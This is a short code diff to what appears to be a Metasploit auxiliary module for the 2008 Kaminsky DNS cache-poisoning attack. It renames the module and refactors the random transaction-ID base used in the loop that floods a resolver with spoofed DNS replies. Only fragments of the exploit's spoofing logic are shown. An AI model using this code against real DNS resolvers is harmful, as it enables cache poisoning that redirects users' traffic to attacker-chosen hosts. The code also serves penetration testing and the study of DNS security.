@@ -11,7 +11,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,	
-			'Name'           => 'DNS BailiWicked Attack',
+			'Name'           => 'DNS BailiWicked Host Attack',
 			'Description'    => %q{
 				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
 				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a single
@@ -132,6 +132,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		recons   = datastore['RECONS']
 		xids     = datastore['XIDS'].to_i
 		ttl      = datastore['TTL'].to_i
+		xidbase  = rand(4)+2*10000
 
 		domain = hostname.match(/[^\x2e]+\x2e[^\x2e]+\x2e$/)[0]
 
@@ -272,8 +273,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			req.qr = 1
 			req.ra = 1
 
-			p = rand(4)+2*10000
-			p.upto(p+xids-1) do |id|
+			xidbase.upto(xidbase+xids-1) do |id|
 				req.id = id
 				barbs.each do |barb|
 					buff = (
